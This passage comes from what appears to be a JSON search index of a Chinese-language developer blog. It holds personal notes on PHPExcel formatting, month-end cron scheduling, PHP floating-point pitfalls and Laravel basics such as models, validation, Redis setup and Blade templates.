'BABABA'),\n));\n$objPHPExcel->getActiveSheet()->getStyle(\"I1:I7\")->applyFromArray($gray);\n\n$yellow = array(\n'fill'  => array(\n    'type' => PHPExcel_Style_Fill::FILL_SOLID,\n    'color' => array('rgb' => 'FFFF00'),\n));\n$objPHPExcel->getActiveSheet()->getStyle(\"F1:F2\")->applyFromArray($yellow);\n$objPHPExcel->getActiveSheet()->getStyle(\"I2\")->applyFromArray($yellow);\n```\n\n## 欄位寬度、高度設定\n\n```php\n//設定 cell 高度\n// 设置默认行高 getDefaultRowDimension\n$objPHPExcel->getActiveSheet()->getDefaultRowDimension()->setRowHeight(12);\n$objPHPExcel->getActiveSheet()->getRowDimension(1)->setRowHeight(16);\n$objPHPExcel->getActiveSheet()->getRowDimension(2)->setRowHeight(16);\n$objPHPExcel->getActiveSheet()->getRowDimension(3)->setRowHeight(36);\n//設定的欄位寬度(+0.71才正確)\n$objPHPExcel->getActiveSheet()->getColumnDimension('A')->setWidth(17);\n$objPHPExcel->getActiveSheet()->getColumnDimension('B')->setWidth(6);\n```\n\n## 欄位數值資料格式\n\n```php\n// 網底\n$objPHPExcel->getActiveSheet()->getStyle(\"A1\")->getFill()->setFillType(PHPExcel_Style_Fill::FILL_PATTERN_LIGHTTRELLIS);\n\n// 設定成數字，並且有千分位逗號\n// excel格式設定裡的#：代表數字，多餘的0會去掉。\n// excel格式設定裡的0:基本上跟#一樣，但是多餘的0會保留。\n$objPHPExcel->getActiveSheet()->getStyle(\"D4:D\".($rows_count).\"\")->getNumberFormat()->setFormatCode('#,##0');\n$objPHPExcel->getActiveSheet()->getStyle(\"O4:O\".($rows_count).\"\")->getNumberFormat()->setFormatCode('$#,##0');\n\n// 設定成百分比\n// 設定拆款百分比30.00%\n$objPHPExcel->getActiveSheet()->getStyle(\"E3:E\".($rows_count).\"\")->getNumberFormat()->setFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE_00);\n$objPHPExcel->getActiveSheet()->getStyle(\"G3:G\".($rows_count).\"\")->getNumberFormat()->setFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE_00);\n$objPHPExcel->getActiveSheet()->getStyle(\"H3:H\".($rows_count).\"\")->getNumberFormat()->setFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE);\n$objPHPExcel->getActiveSheet()->getCell('H4')->setValueExplicit('0.3', PHPExcel_Cell_DataType::TYPE_NUMERIC);\n```\n\n## 凍結窗格\n\n```php\n//凍結窗格\n$objPHPExcel->getActiveSheet()->freezePane('A6');\n$objPHPExcel->getActiveSheet()->freezePane('D6');\n```\n\n## 建立新的\n\n```php\n$objPHPExcel->createSheet(); //建立新的工作表\n$objPHPExcel->setActiveSheetIndex($index+1);//現編輯頁\n$objPHPExcel->getActiveSheet()->setTitle(\"標題名稱\");  //設定標題\n```\n\n## 動態處理橫軸資料(A~AZ)\n\nPHPExcel 可以用 `$objPHPExcel->getActiveSheet()->setCellValue(\"A1\", $month_date );`\n塞值真的非常方便\n但是沒辦法動態產生資料\n可以透過`setCellValueByColumnAndRow`\n但注意第一個欄(column 英文)是從 0 開始\n列是從 1 開始\n`$objPHPExcel->getActiveSheet()->setCellValueByColumnAndRow(0, 1,\"2019-04月\");`\n\n但還有一個問題，就是轉換 getStyle 沒有這類似 function\n`PHPExcel_Cell::stringFromColumnIndex` 可以簡單轉換\nstringFromColumnIndex(0) = 'A' <=> columnIndexFromString\n\n```php\n// 一般\n$objPHPExcel->getActiveSheet()->setCellValueByColumnAndRow(0, 1,.\"2019-04月\");\n// 合併儲存格\n$objPHPExcel->getActiveSheet()->mergeCellsByColumnAndRow( $index, 1, $index + 8 , 1);\n\n// PHPExcel_Cell::stringFromColumnIndex\n$objPHPExcel->getActiveSheet()->getStyle(PHPExcel_Cell::stringFromColumnIndex( $index ).'1')->getAlignment()->setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);\n$objPHPExcel->getActiveSheet()->getStyle(PHPExcel_Cell::stringFromColumnIndex( $index ).'1')->getAlignment()->setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);\n\n// 公式運算方法\n$col1 = PHPExcel_Cell::stringFromColumnIndex($index + 1);\n$col2 = PHPExcel_Cell::stringFromColumnIndex($index + 2);\n$col3 = PHPExcel_Cell::stringFromColumnIndex($index + 3);\n$objPHPExcel->getActiveSheet()->setCellValueByColumnAndRow($o2, '4',\"={$col1}4+{$col2}4+{$col3}4\");\n$objPHPExcel->getActiveSheet()->setCellValueByColumnAndRow($o2, '4',\"=SUM({$scol}$5:{$scol}$\".($nu+4).\")\");\n```\n\n## 匯出 EXCEL\n\n```php\n// Export to Excel2007 (.xlsx)\n$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, \"Excel2007\");\n$objWriter->save('export/filename.xlsx');\n```\n\n[Ron, Run ~~: PHPExcel - 如何設定儲存格代號](http://ron314159.blogspot.com/2011/02/phpexcel.html)\n[PHP 輸出 Excel ，使用 PHPExcel](https://www.puritys.me/docs-blog/article-33-PHP-%E8%BC%B8%E5%87%BA-Excel-%EF%BC%8C%E4%BD%BF%E7%94%A8PHPExcel.html)\n[PHP excel 設置參數 - IT 閱讀](https://www.itread01.com/content/1507728009.html)\n\n## 其他程式使用方式\n\nJava 使用 POI 方式\n但我覺得不好用....\n\nJavaScript 有找到 js-xlsx，做匯入資料感覺非常方便\n一般報表還可以，複雜格式報表可能不行\n但是進階設定需要付費，所以還是很可惜\n\n[Node 读写 Excel 文件探究实践 | Aotu.io「凹凸实验室」](https://aotu.io/notes/2016/04/07/node-excel/index.html)\n[【node+demo】使用 xlsx-style 设置表格的宽高等样式 - 简书](https://www.jianshu.com/p/877631e7e411)\n[使用 js-xlsx 纯前端导出 excel - 个人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000019700368)\n不知道為什麼範例沒辦法用出顏色\n\n網路文章:\n\n- [Merge Cell values with PHPExcel - PHP - Stack Overflow](https://stackoverflow.com/questions/6820250/merge-cell-values-with-phpexcel-php)\n- [PHP 輸出 Excel ，使用 PHPExcel](https://www.puritys.me/docs-blog/article-33-PHP-%E8%BC%B8%E5%87%BA-Excel-%EF%BC%8C%E4%BD%BF%E7%94%A8PHPExcel.html)\n- [基于 Excel 模板导出——ExcelTemplate - gezhonglei2007 的专栏 - CSDN 博客](https://blog.csdn.net/gezhonglei2007/article/details/51475059)\n- [phpspreadsheet 开发手记 - leestar54 - 博客园](https://www.cnblogs.com/leestar54/p/7786806.html)\n- [columnIndexFromString and stringFromColumnIndex are not compatible · Issue #307 · PHPOffice/PHPExcel](https://github.com/PHPOffice/PHPExcel/issues/307)\n- [merge cells from Array of Arrays · Issue #964 · SheetJS/js-xlsx](https://github.com/SheetJS/js-xlsx/issues/964)\n- [纯前端利用 js-xlsx 之单元格样式(4) - 简书](https://www.jianshu.com/p/869375439fee)\n- [PHPExcel Notes and code snippets](https://gist.github.com/yajra/a71d030e68126714e88a)\n\n公司有遇到RAM 吃很大的問題\n[phpExcel導出文件時內存溢出的問題 - Cocowool - 博客園](https://www.cnblogs.com/cocowool/p/6893774.html)\n\n\n- [mk-j/PHP_XLSXWriter: Lightwight XLSX Excel Spreadsheet Writer in PHP](https://github.com/mk-j/PHP_XLSXWriter)","tags":["phpexcel"],"categories":["PHP"]},{"title":"排程 crontab 時間設定月底執行方法","url":"%2Fblog%2F2019%2F08%2F04%2F%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95%2F","content":"\n最近專案需要設定排程\n主機上面的時區是 UTC+0 時間\n但我們需要照 GMT+8 執行\n排程往前面推-8 小時\n但這時候遇到一個問題了\n設定月初時間會跨前一天問題\n\n<!--more-->\n\n## 排程設定 L 字符\n\n`0 16 L * * *`\n\n有些排程工具是支援的 (spring, quartz)\nLINUX crontab 不支援\n\n## shell 程式執行判斷\n\n最近專案需要在 Rancher 設定\n所以上面的方法無法用\n有參考使用[Crontab 每月最後一天執行 Shell Script](https://www.opencli.com/linux/crontab-run-on-last-day-of-month)\n可以完成，範例如下\n\n```bash\n\n# 沒有環境變數，為true\nif [ -z \"$MODE\" ]; then\n    php .....\nelse\n    # 時間用 0 0 28-31 * *\n    # 日期加一天為1，就算是今日事月底最後一天\n    DAY=$(date -d \"$(date +%Y-%m-%d) +1 day\" +%e)\n    if [ \"$MODE\" = 'monthoflastday' ]; then\n        if test $DAY -eq 1; then\n            #  run the script here\n            php ......\n        fi;\n    fi;\nfi;\n```\n\n簡單說明就是 Rancher 要跑的 JOB 要多一個 `MODE` 環境變數\n透過這個知道哪個要執行月底執行，有些不用\n\n## crontab 簡單判斷方法\n\n55 23 28-31 \\* \\* [[ \"$(date --date=tomorrow +\\%d)\" == \"01\" ]] && myjob.sh\n參考[automation - Cron job to run on the last day of the month - Stack Overflow](https://stackoverflow.com/questions/6139189/cron-job-to-run-on-the-last-day-of-the-month)\n\n其他 date 設置可以參考\n[Linux 使用 date 計算時間(昨天、明天) | Tsung's Blog](https://blog.longwin.com.tw/2010/07/linux-date-computer-2010/)\n[linux 中用 shell 获取时间,日期 - ccmaotang - 博客园](https://www.cnblogs.com/tangtianfly/p/3457668.html)\n\n## shell 跑時間迴圈方法\n\n另外 shell 跑時間迴圈方法\n[Bash: Looping through dates - Stack Overflow](https://stackoverflow.com/questions/28226229/bash-looping-through-dates)\n\n```bash\nd=2015-01-01\nwhile [ \"$d\" != 2015-02-20 ]; do\n  echo $d\n  d=$(date -I -d \"$d + 1 day\")\ndone\n```\n\n其他參考來源:\n\n- [automation - Cron job to run on the last day of the month - Stack Overflow](https://stackoverflow.com/questions/6139189/cron-job-to-run-on-the-last-day-of-the-month)\n- [shell - How to check if a variable is set in Bash? - Stack Overflow](https://stackoverflow.com/questions/3601515/how-to-check-if-a-variable-is-set-in-bash)\n- [Cron allowed special character \"L\" for \"Last day of the month\" on Debian - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/89188/cron-allowed-special-character-l-for-last-day-of-the-month-on-debian)\n- [cron - Wikipedia](https://en.wikipedia.org/wiki/Cron#Format)\n- [date - Jenkins -run job 2 days before end of every month - Stack Overflow](https://stackoverflow.com/questions/49295240/jenkins-run-job-2-days-before-end-of-every-month)\n- [cron-last-sunday/run-if-today at master · xr09/cron-last-sunday](https://github.com/xr09/cron-last-sunday/blob/master/run-if-today)\n- [鳥哥的 Linux 私房菜 -- 第十五章、例行性工作排程(crontab)](http://linux.vbird.org/linux_basic/0430cron.php#anacron_1)\n- [linux下crontab与anacrontab的使用 - 小柒吃地瓜](https://www.i7dom.cn/179/2019/13/linux-cron-cycle.html)\n","tags":["linux"],"categories":["Linux"]},{"title":"PHP 做浮點數需要注意的事情","url":"%2Fblog%2F2019%2F08%2F04%2FPHP-%E5%81%9A%E6%B5%AE%E9%BB%9E%E6%95%B8%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85%2F","content":"\n最近公司做報表程式，看到裡面程式會 0.3254\\*1000 先做運算\n然後運算完後會`除1000`\n原本猜想是不是有浮點數問題\n但我印象 0.1+0.2=0.3，這部分 PHP 好像沒有什麼問題\n[0.30000000000000004.com/](https://0.30000000000000004.com/)\n但我今天看到這篇有提到[php 踩過的那些坑（1）浮點數計算 - 每日頭條](https://kknews.cc/zh-tw/finance/y86vrrj.html)\n\n<!--more-->\n\n> 二、防坑攻略：\n> 1、通過乘 100 的方式轉化為整數加減，然後在除以 100 轉化回來……\n> 2、使用 number_format 轉化成字符串，然後在使用（float）強轉回來……\n> 3、php 提供了高精度計算的函數庫，實際上就是為了解決這個浮點數計算問題而生的。\n> 原文網址：https://kknews.cc/finance/y86vrrj.html\n\n使用 bcsub 方式可以解決問題，但記得後面要加入要算出來的浮點數\n\n```php\n$a = 2586;\n$b = 2585.98;\nvar_dump($a-$b);\n```\n\n有找到這個文章原始來源\n這幾篇，也不錯\n\n- [php 踩过的那些坑(1) isset()详解 - 壁虎漫步. - 博客园](https://www.cnblogs.com/phpfensi/p/8143355.html) {% asset_link web1.png 備份圖 %}\n- [php 踩过的那些坑(2) strpos 引发的血案 - 壁虎漫步. - 博客园](https://www.cnblogs.com/phpfensi/p/8143358.html) {% asset_link web2.png 備份圖 %}\n- [php 踩过的那些坑(3) 数据类型转换 - 壁虎漫步. - 博客园](https://www.cnblogs.com/phpfensi/p/8143360.html) {% asset_link web3.png 備份圖 %}\n- [php 踩过的那些坑(4) false,NULL,0,''详解 - 壁虎漫步. - 博客园](https://www.cnblogs.com/phpfensi/p/8143363.html) {% asset_link web4.png 備份圖 %}\n- [php 踩过的那些坑（5）浮点数计算 - 壁虎漫步. - 博客园](https://www.cnblogs.com/phpfensi/p/8143367.html) {% asset_link web5.png 備份圖 %}\n\n更多作者寫的內容\n\n- [PHP - 随笔分类 - 壁虎漫步. - 博客园](https://www.cnblogs.com/phpfensi/category/594117.html)\n","tags":["php"],"categories":["PHP"]},{"title":"Laravel 實作小記","url":"%2Fblog%2F2019%2F07%2F16%2FLaravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98%2F","content":"\n由於最近看 Laravel 都沒有用在實戰上面\n想藉由這個機會時做看看\n不寫還真的有些不習慣\n特別紀錄一下\n\n--尚未整理完--\n\n<!--more-->\n\n## Laravel 新增檔案起手勢\n\n### 建立一個 Model\n\n--migration 順便產生 migrate 檔案\n\n**Table 取的名會是複數**\n**Table 取的名會是複數**\n**Table 取的名會是複數**\n獎如是要自己新增的要注意!!!\n\n```bash\nphp artisan make:model Event --migration\nphp artisan make:model Timer --migration\n```\n\n### 建立一個 Controller\n\n```\nphp artisan make:controller CustomersController\nphp artisan make:controller CustomersController --model=Customer\n```\n\n`--migration` 我以為能順便新增 migrate\n但是不行!!!\n\n### 三個願望一次滿足\n\n新建東西，想把所有 Controller 建立出來要怎麼用?\n[Laravel 5.4 create model, controller and migration in single artisan command - Stack Overflow](https://stackoverflow.com/questions/43187735/laravel-5-4-create-model-controller-and-migration-in-single-artisan-command)\n\n```\nphp artisan make:model Todo -mcr\n```\n\n-m, --migration Create a new migration file for the model.\n-c, --controller Create a new controller for the model.\n-r, --resource Indicates if the generated controller should be a resource controller\n或者\n\n```\nphp artisan make:model Todo -a\n```\n\n-a, --all Generate a migration, factory, and resource controller for the model\n\n## Model 要注意的事情\n\n### fillable\n\n每次新增 Model 完成，但通常會忘記填這個東西\n仔細看這個，這個變數是防止 input 帶入 model 裡面\n會被塞入奇奇怪怪的值\n某種意義來說就是安全性!!\n\n### 關聯\n\n### hasMany <=> belongTo\n\nhasMany\n\n```\n    public function comments()\n    {\n        return $this->hasMany('App\\Comment');\n    }\n```\n\n```\n    public function post()\n    {\n        return $this->belongsTo('App\\Post');\n    }\n```\n\n[Laravel 多張 table 使用 ORM 查詢 (遠層一對多關聯) – Bryce'S Note](http://blog.twbryce.com/laravel-%E5%A4%9A%E5%BC%B5table%E4%BD%BF%E7%94%A8orm%E6%9F%A5%E8%A9%A2-%E9%81%A0%E5%B1%A4%E4%B8%80%E5%B0%8D%E5%A4%9A%E9%97%9C%E8%81%AF/)\n\n### Many to Many\n\n我一直以為 X 對 X 就是講兩個 table，但是多對多簡單來講就是要用`3個 table`\n而中介 table 命名為`aaa_bbb`(照英文順序命名，如:~~bbb_aaa~~會有問題，但可透過 belongToMany(xxxx,'bbb_aaa'))\n\n簡單說一下，Many to Many 實作使用 3 個 table 但是只會寫 2 個 table(但 pivot 可自訂 class)，詳細官網一下，但通常應該不用寫\n使用上 attach,detach,sync 控制 pivot 內容\npivot 通常不會建立 `id` 欄位\n當然要設定也是能做到\n\n## ORM with 預載入\n\n只能用再 X 對多\n\n#### Event()->timers() 出現找不到 function 問題\n\n`BadMethodCallException with message 'Call to undefined method App/Event::timers()'`\n哪尼我照官方範例新增一個 Project 怎麼會錯呢!!!\n怎麼 Google 都找不到問題，最後我發現是`protected`關係，要用`public`\n為什麼呢? `App\\Event::find(1)` 沒有 new 出物件\n所以`protected`的`timers()`就呼叫不到!!!\n這是很正常的\n**所以要用`public`!!!**\n**所以要用`public`!!!**\n**所以要用`public`!!!**\n耗費一小時在查這個 orz\n\n### Model::find(20) 實現原理\n\n這篇寫的很清楚\n[深入理解 laravel 中的 Eloquent ORM、查询构建器的核心原理 - 简书](https://www.jianshu.com/p/026c6cd2767f)\n\n### 命名建議\n\n## Form 表單這件事\n\n我覺得網頁這個要熟悉\n才能掌握網頁的程式\n但是實作才了解 Laravel 我還不太了解\n\n### create 和 edit 拆開寫兩個 View\n\n一開始實作我覺得應該有方法讓兩個 view 合併\n我從書上 view 有一個 `old()` 函式可以呼叫 redirect->with 出來東西\n但是 view 變數沒抓到(未定義)的時候，可能程式錯誤無法顯示問題\n\n再繼續寫，我發現 from 表單我使用`route`定義的時候\n我發現一件事情，action 導去路徑不一樣\n`@method('POST')` 和 `@method('POST')` 不一致\n就算這些可以用邏輯去判斷網址\n但我覺得會越來越亂\n為何不如就分開兩個 view\n\n其實表單重複的部分\n我覺得可以用`@include`帶入\n不過我等熟悉看如何做到\n\n## contoller view\n\n```php\n        return view('page/week1/list');\n        return view('page.week1.show')->with('event', Event::find($id));\n        return view('page.week1.update', ['event' => $event]);\n```\n\n可以用多個帶值到 View 裡面\n可算說是非常方便\n\n## 驗證起手勢\n\n```php\n        $input = Input::all();\n\n        $validator = Validator::make($input, [\n            'name' => 'required|max:100',\n        ]);\n\n        if ($validator->fails()) {\n            return redirect()->route('week1.edit', ['id' => $id])\n                ->withErrors($validator)\n                ->withInput();\n        }\n\n```\n\n尚未了解事情\n\n```php\n        // 非正確的時候會導入到首頁，目前找不到修改對應首頁方法，建議用Validator::make\n        $validatedData = $request->validate([\n            'name' => 'required|max:1',\n        ]);\n```\n\n### error 顯示方法\n\nredirect()->withErrors\n可以抓取到\n\n```html\n@if ($errors->any())\n<div class=\"alert alert-danger\">\n  <ul>\n    @foreach ($errors->all() as $error)\n    <li>{{ $error }}</li>\n    @endforeach\n  </ul>\n</div>\n```\n\n> 正如前面所提到的，Laravel 會自動把使用者重導到先前的位置。另外，所有的驗證錯誤會被自動快閃至 session。\n> 同樣的，注意我們不需要在 GET 路由明確的綁定錯誤訊息至視圖。這是因為 Laravel 會自動檢查 session 內的錯誤資料，如果錯誤存在的話，會自動綁定這些錯誤訊息到視圖。所以，請注意到 $errors 變數在每次請求的所有視圖中都將可以使用，讓你可以方便假設 $errors 變數已被定義且可以安全地使用。\\$errors 變數是 Illuminate\\Support\\MessageBag 的實例。有關此物件的詳細資訊，請查閱它的文件。\n\n### success 方法\n\n內建沒有 WithSuccess\n但還是可以塞自己想要的資料\n\n```php\n        return redirect()->route('week1.edit', ['id' => $id])\n            ->with('success', '修改成功');\n```\n\n```html\n@endif @if (session()->has('succes'))\n<div class=\"alert alert-primary\">\n  <ul>\n    <li>{{ session()->get('succes') }}</li>\n  </ul>\n</div>\n@endif\n```\n**上面也可以用`@if(isset($success))`**\n注意with 除了寫 session 他也可以當view 變數名稱\n\n## Laravel 有關 with function 那些事情\n\n一直看書看到有很多地方都有用到 with\n不仔細看，我還以為他們都是一樣的東西\n但是用在不同地方還是不一樣\n\n### orm with\n\n之前我有小記，但我沒有用，有空來小記\n[總結要點：使用 Laravel 開發工具，ORM 查詢的 N + 1 問題 | Laravel China 社區 - 高品質的 Laravel 開發者社區](https://learnku.com/laravel/t/7778/summary-using-the-laravel-development-tool-the-n-1-problem-of-the-orm-query)\n\n### view with\n\n這個等於 view()第二個參數帶到 blade 去\n\n[laravel5-example/resources/views/back/blog at master · bestmomo/laravel5-example](https://github.com/bestmomo/laravel5-example/tree/master/resources/views/back/blog)\n\nView 資料夾要如何分?\n目前我只想到 layout ,page\n但官方沒有限制\n很多 Project 都不時一樣\n\n[laravel5-example/resources/views/back/blog at master · bestmomo/laravel5-example](https://github.com/bestmomo/laravel5-example/tree/master/resources/views/back/blog)\n\n### redirect with\n\n一直以為這個跟 view with 一樣\n但是看一下原始碼\n他是存在 session(flashdatg 下一個頁面就會清除) ，可以用 old 快速呼叫\n原本我以為可以用 create 和 edit 共用同一個 view\n但發現難度太高，因為 old('name',\\$event->name)\n但是在 create 頁面就會掛掉\n也許我可以在 create 做一個`空event`?\n有空試試看\n\nwithErrors 和 withInput 一樣的道理\n\n## action 和 route 選擇\n\n```php\n    {{ action('EventController@edit', ['id'=>1]) }}\n    {{ route('week1.edit', ['id'=>1]) }}\n```\n\n我選擇用 route\n打很少字，就算之後要換檔名不用修改很多檔案裡面的內容\n可以算是非常方便\n\n## 用 Laravel Mix 記得加 meta csrf\n\n```html\n<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\" />\n```\n\nConsole.log 好心提醒\nCSRF token not found: https://laravel.com/docs/csrf#csrf-x-csrf-token\n\n## Laravel 5.x 移除 html helper\n\n不知道為什麼超多人還是有用\n[laravel 5 Form 和 HTML 的使用 - 袁超 - SegmentFault 思否](https://segmentfault.com/a/1190000002605467)\n\n## DB(ORM) 建立交易\n\n需要抓到外面的變數可以用 use\n\n```php\n        DB::transaction(function () use ($input, &$is_save) {\n            $event = new Event($input);\n            $event->save();\n            $event->sort = $event->id;\n            $is_save = $event->save();\n        });\n\n```\n\n[鎖定資料 Lock · Laravel 5 學習筆記](https://kejyuntw.gitbooks.io/laravel-5-learning-notes/database/model/database-model-eloquent-lock.html)\n\n## 服務容器\n\n- [从 1 行代码开始，带你系统性地理解 Service Container 核心概念 | Laravel China 社区](https://learnku.com/laravel/t/3361/starting-with-the-1-line-of-code-with-a-systematic-understanding-of-the-core-concepts-of-service-container)\n- [从 1 行代码开始，带你系统性地理解 Service Container 核心概念 | Laravel China 社区](https://learnku.com/laravel/t/3361/starting-with-the-1-line-of-code-with-a-systematic-understanding-of-the-core-concepts-of-service-container#%E4%B8%80%E4%B8%AA%E5%9F%BA%E7%A1%80%E7%89%88%E7%9A%84-IOC-Container)\n- [Laravel 学习笔记 —— 神奇的服务容器 | Laravel China 社区](https://learnku.com/articles/789/laravel-learning-notes-the-magic-of-the-service-container)\n\n以上兩篇我看完小記的觀點，不一定正確，建議還是看裡面的內容。\n我覺得這幾篇講的名詞都很抽象，所以不是很好懂(但是裡面這幾篇算是我找得最清楚的)\n先講講我怎麼看裡面容器\n~~我當初以為所有類別都是容器~~但其實容器應該就是指`Container::getInstance`這一段類別\n\n更深入了解 Ioc 和 DI 意思\n我覺得可以看下面這邊\n[控制反轉 (IoC) 與 依賴注入 (DI) - NotFalse 技術客](https://notfalse.net/3/ioc-di)\n\n感想\n看完有種想把所有東西都塞到容器裡面?\n但我後來想想應該不需要\n我覺得容器有點像兩個 class 工通橋梁(如 Laravel app())\n再透過 Facade 或 helper function 更加方便\n同時兩個類別可以呼叫不同 class bind 後的實例\n\n[Laravel 如何實現依賴性注入？ - 技術保鮮盒 - Medium](https://medium.com/mr-efacani-teatime/laravel%E5%A6%82%E4%BD%95%E5%AF%A6%E7%8F%BE%E4%BE%9D%E8%B3%B4%E6%80%A7%E6%B3%A8%E5%85%A5-d760c8e5abde)\n\n### Repository\n\n- [在 Laravel 5 中使用 Repository 模式实现业务逻辑和数据访问的分离 - Laravel 学院](https://laravelacademy.org/post/3063.html)\n\n- [为什么你应该使用 Repository - Laravel - SegmentFault 思否](https://segmentfault.com/a/1190000003488038)\n\n- [如何使用 Repository 模式 · laravel 学习 · 看云](https://www.kancloud.cn/curder/laravel/408484)\n\n## factory /seeder\n\n[Laravel - Seeding Many-to-Many Relationship - Stack Overflow](https://stackoverflow.com/questions/45269146/laravel-seeding-many-to-many-relationship)\n\n## form checkbox\n\n[php - laravel 怎么接收和保存一组 checkbox 到数据库？ - SegmentFault 思否](https://segmentfault.com/q/1010000005107466)\n\n## 控制器依賴注入原理\n\n- [自訂隱晦路由器參數查詢 - Yish - Medium](https://medium.com/yish/%E8%87%AA%E8%A8%82%E9%9A%B1%E6%99%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E5%8F%83%E6%95%B8%E6%9F%A5%E8%A9%A2-b4ce73d4df6a)\n- [关于 laravel5.5 控制器方法参数依赖注入原理深度解析及问题修复 - 程序人生 ♨︎ - 博客园](https://www.cnblogs.com/springwind2006/p/7780524.html)\n\n## 授權 GATE & Policy\n\n[laravel5.5 授权系统 - archer-wong - 博客园](https://www.cnblogs.com/redirect/p/8658740.html#%E9%80%9A%E8%BF%87%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9E%8B)\n\n## Redis\n\nLaravel 6.2 使用 Redis::get 會遇到\n```\nPlease remove or rename the Redis facade alias in your \"app\" configuration file in order to avoid collision with the PHP Redis extension.\n```\n\n使用 `Cache::put` 看似能用，但預設 env 是 file，切換到 redis，還是遇到一樣的問題\n看似 Homestead 預設沒安裝 redis 套件\nphpredis 需要改裡面程式內容\n這邊有兩個做法\n\n1.  改成用 predis 方法(不推薦)\n\ncomposer require predis/predis\n\n> 1 Replace in config\\app.php\n> aliasess:\n> 'Redis' => Illuminate\\Support\\Facades\\Redis::class,\n> for:\n> 'RedisManager' => Illuminate\\Support\\Facades\\Redis::class,\n> \n> 2 Replace in config\\database.php\n> \n> 'redis' => [\n>\n>    'client' => env('REDIS_CLIENT', 'predis'), //default phpredis\n>    ...\n\n參考來源:https://github.com/laravel/horizon/issues/659#issuecomment-528569052\n\n2.  改成用 phpredis 方法\n\nHomestead 預設沒有安裝 php redis 套件，所以需要手動安裝\n不知道新版的 Homestead 會不會預設安裝?\n可參考:[Homestead 安装 PHP Redis 扩展 | Laravel China 社区](https://learnku.com/articles/33412) {% asset_link web1.png 備份圖 %}\n\n相關資料:\n[Homestead 安装 PHP Redis 扩展 - 菜园子 - SegmentFault 思否](https://segmentfault.com/a/1190000016606114)\n[Homestead 环境没有 phpize 怎么安装 Redis 扩展？？？ | Laravel China 社区](https://learnku.com/laravel/t/14226/homestead-environment-without-phpize-how-to-install-redis-extension)\n[Laravel 6 使用 Redis 注意事项 | Laravel China 社区](https://learnku.com/laravel/t/33538)\n\n## Laravel Help\n\nhttps://stackoverflow.com/questions/58163406/after-upgrading-laravel-from-5-6-to-6-0-call-to-undefined-str-random-function\n\n## Laravel Router 多人維護最佳方式\n\n[Laravel 分割 routes.php 路由文件的最佳方式 | Laravel China 社区](https://learnku.com/laravel/t/2484/the-best-way-to-split-routesphp-laravel-routing-file)\n\n## Laravel blade Javascript 設計\n[Laravel – 設計一個好的 Blade Template, 使用 @parent | 不怕就是強](https://dinos80152.wordpress.com/2015/08/04/laravel-%e8%a8%ad%e8%a8%88%e4%b8%80%e5%80%8b%e5%a5%bd%e7%9a%84-blade-template-%e4%bd%bf%e7%94%a8-parent/)\n\n一般設計\n[Jigsaw – Static Sites for Laravel Developers](https://jigsaw.tighten.co/docs/content-blade/)\n\n## Laravel 6 安裝 Bootstrap 6\n\ncomposer require laravel/ui --dev\n\n```\n// Generate basic scaffolding...\nphp artisan ui bootstrap\nphp artisan ui vue\nphp artisan ui react\n\n// Generate login / registration scaffolding...\nphp artisan ui bootstrap --auth\nphp artisan ui vue --auth\nphp artisan ui react --auth\n```\n## blade\n### 使用 Laravel Navbar 做 selected 設定\n\n```html\n<ul class=\"nav nav-second-level\">\n  <li class=\"{{ Request::segment(1) === 'programs' ? 'active' : null }}\">\n      <a href=\"{{ url('programs' )}}\" ></i> Programs</a>\n  </li>\n  <li class=\"{{ Request::segment(1) === 'beneficiaries' ? 'active' : null }}\">\n      <a href=\"{{url('beneficiaries')}}\"> Beneficiaries</a>\n  </li>\n  <li class=\"{{ Request::segment(1) === 'indicators' ? 'active' : null }}\">\n      <a href=\"{{url('indicators')}}\"> Indicators</a>\n  </li>\n</ul>\n```\nor\n```html\n  <div class=\"container-fluid\">\n    <div class=\"navbar-header\">\n      <a class=\"navbar-brand\" href=\"#\">WebSiteName</a>\n    </div>\n    <ul class=\"nav navbar-nav\">\n      <li class=\"{{Request::is('/')?'active':''}}\"><a href=\"{{url('/')}}\">Home</a></li>\n      <li class=\"{{Request::is('/page1')?'active':''}}\"><a href=\"{{url('/page1')}}\">Page 1</a></li>\n      <li class=\"{{Request::is('/page2')?'active':''}}\"><a href=\"{{url('/page2')}}\">Page 2</a></li>\n      <li class=\"{{Request::is('/page3')?'active':''}}\"><a href=\"{{url('/page3')}}\">Page 3</a></li>\n    </ul>\n  </div>\n</nav>\n```\n- [php - Setting Bootstrap navbar active class in Laravel 5 - Stack Overflow](https://stackoverflow.com/questions/29837555/setting-bootstrap-navbar-active-class-in-laravel-5)\n- [how to set bootstrap navbar class active - Scoopism](https://www.scoopism.com/bootstrap/how-to-set-bootstrap-navbar-class-active/)\n\n### blade section/show\n\n\n> 2. 使用 @section ('yourSectionName').....@show。子子孫孫都使用 @section ('contents')......@endsection 去繼承實現。\n\n[關於 @section...@show;@section....@endsection 的用法分析 | Laravel China 社區](https://learnku.com/laravel/t/13853/an-analysis-of-the-usage-of-at-section-at-show-at-section-at-endsection)\n\n## 其他\n\n- [php - prepare 与 sql 的开销？ - SegmentFault 思否](https://segmentfault.com/q/1010000009649587/)\n- [使用 batch insert 解决 MySQL 的 insert 吞吐量问题 - billy 鹏 - 博客园](https://www.cnblogs.com/billyxp/p/3631242.html)\n  [php - Laravel Eloquent compare date from datetime field - Stack Overflow](https://stackoverflow.com/questions/25139948/laravel-eloquent-compare-date-from-datetime-field)\n- [php 下 foreach()错误提示 Warning: Invalid argument supplied for foreach()\\_一聚教程网](http://www.111cn.net/phper/php/58561.htm)\n- [php 出现 Warning: A non-numeric value encountered 问题的原因及解决方法 - 傲雪星枫 - CSDN 